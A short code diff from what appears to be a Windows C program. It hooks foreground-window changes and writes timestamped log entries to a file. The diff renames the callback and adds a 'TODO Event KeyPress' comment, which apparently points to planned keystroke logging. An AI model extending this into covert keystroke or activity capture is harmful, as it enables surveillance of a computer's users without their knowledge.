@@ -42,7 +42,7 @@ char	*GetDateFormated(void)
 	return dateStr;
 }
 
-void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
+void CALLBACK WinEvent(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
 	DWORD event, // Event type
 	HWND hwnd, // Handle to the window that generated the event
 	LONG idObject,	 // Object identifier
@@ -79,6 +79,7 @@ void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event 
 		write_to_file(logEntry);
 		free(dateStr);
 	}
+	// TODO Event KeyPress
 }
 
 int	main(void)
@@ -94,7 +95,7 @@ int	main(void)
 	HWINEVENTHOOK hook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
 		NULL,
-		WinForeground,
+		WinEvent,
 		0, 0,
 		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
 	if (hook == NULL)
